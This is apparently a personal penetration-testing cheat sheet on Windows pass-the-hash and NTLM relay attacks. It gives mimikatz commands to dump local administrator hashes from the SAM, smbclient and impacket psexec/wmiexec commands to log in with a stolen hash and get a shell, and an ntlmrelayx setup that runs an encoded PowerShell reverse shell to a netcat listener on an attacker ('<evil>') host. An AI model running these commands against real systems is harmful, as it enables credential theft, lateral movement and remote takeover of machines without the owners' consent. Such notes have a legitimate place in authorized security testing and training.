---
title: Pass the Hash
updated: 2025-04-29 04:36:28Z
created: 2025-04-28 08:49:43Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Extract HASH of Local Administrator using mimikatz:

1. As **Administrator**, run `mimikatz.exe` 
2. `privilege::debug`
3. `token::elevate` 
4. `lsadump::sam`
5. Save the Administrator Hash for later use.
**Note**: Passing NTLM hash requires NTLM to be the authentication mechanism.
(eg, SMB, RDP, WinRM)

* * *
## SMB
`smbclient \\\\<target>\\<share> -U <user> --pw-nt-hash <Insert_Hash>`
* * *
## Obtain a Shell

### impacket-psexec
`impacket-psexec -hashes 00000000000000000000000000000000:<NTLM_HASH> <user>@<target>`

### impacket-wmiexec
`impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_HASH> <user>@<target>`
* * *
## Pass the Hash
**Note**: Microsft **UAC** may impact commands run with Pass the Hash
### SMB
Pre-requisite: Create a reverse shell to port 8080 and then Base64 encode it.
1.Using **impacket**, setup a relay to run a powershell command on the target
`impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "powershell -enc <Bas64_coded_command>"`
2. Start a **netcat** listener on port **8080**
`nc -nvlp 8080`
3. On the target machine, connet to the kali fake with smb
`dir \\<evil>\blah`
4. Check the conosle running impacket relay to see if the hash was relayed and the powershell command executed.